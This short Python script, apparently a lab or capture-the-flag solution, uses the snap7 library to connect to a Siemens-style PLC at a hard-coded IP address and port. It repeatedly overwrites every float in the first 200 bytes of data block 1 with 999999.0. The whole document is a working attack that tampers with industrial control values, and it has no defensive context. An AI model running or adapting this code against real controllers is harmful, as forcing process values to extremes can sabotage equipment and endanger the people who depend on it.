import snap7, struct

p5552 = snap7.client.Client()
p5552.connect('154.57.164.79', 0, 1, 31060)

if p5552.get_connected():
    while True:
        data = bytearray(p5552.db_read(1, 0, 200))
        for i in range(0, 200, 4):
            data[i:i+4] = struct.pack('>f', 999999.0)
        p5552.db_write(1, 0, bytes(data))
else:
    print("failed to connect")
